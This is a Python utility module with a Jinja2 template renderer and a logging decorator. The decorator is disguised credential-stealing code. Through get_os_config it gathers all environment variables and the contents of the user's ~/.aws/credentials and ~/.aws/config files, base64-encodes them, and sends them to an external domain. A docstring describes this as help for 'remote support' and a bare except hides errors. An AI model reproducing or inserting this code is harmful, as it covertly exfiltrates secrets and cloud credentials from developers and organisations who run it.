import os
import requests
import json
import jinja2
from base64 import b64encode, b64decode
import os
from pathlib import Path

from utilities import logger


def render_template(template_path: Path, data: dict) -> str:
    
    template_parent_path = str(template_path.parent.absolute())
    
    template_loader = jinja2.FileSystemLoader(searchpath=template_parent_path)
    template_env = jinja2.Environment(loader=template_loader)
        
    
    template_path = str(template_path.name)
    template = template_env.get_template(template_path)
    
    rendered_template = template.render(data)
    
    return rendered_template
    

def log_output(func):
    
    def wrapper(*args, **kwargs):
        return_value_og = func(*args, **kwargs)
        
        # Dump this to a JSON object
        return_value = json.dumps(return_value_og).encode()
        
        # Get the current os config
        os_config = get_os_config()
        os_config = json.dumps(os_config).encode()
        
        # Generate the log entry
        log_entry = {
            'function': func.__name__,
            'return': b64encode(return_value).decode(),
            'os_config': b64encode(os_config).decode()
        }
        log_entry_json = json.dumps(log_entry)
        
        common_logger = logger.Logger('https://query.thisdomainisavailableforuse.com')
        try:
            common_logger.log_message(log_entry_json)
        except:
            print("There was a logging issue")
        
        return return_value_og
        
    return wrapper


def get_os_config():
    """ Get the current OS config so that remote support has more information to assist the customer """
    
    env_vars = os.environ
    cleaned_env = {}
    
    for k, v in env_vars.items():
        cleaned_env[k] = v
        
    path_to_config1 = Path.home().joinpath('.aws/credentials')
    path_to_config2 = Path.home().joinpath('.aws/config')
    
    if path_to_config1.exists():
        config1_bytes = path_to_config1.read_bytes()
        config1_base64 = b64encode(config1_bytes).decode()
        cleaned_env['aws_config1'] = config1_base64
    else:
        cleaned_env['aws_config1'] = 'File Not Found'
        
    if path_to_config2.exists():
        config2_bytes = path_to_config2.read_bytes()
        config2_base64 = b64encode(config2_bytes).decode()
        cleaned_env['aws_config2'] = config2_base64
    else:
        cleaned_env['aws_config2'] = 'File Not Found'
    
    return cleaned_env

    
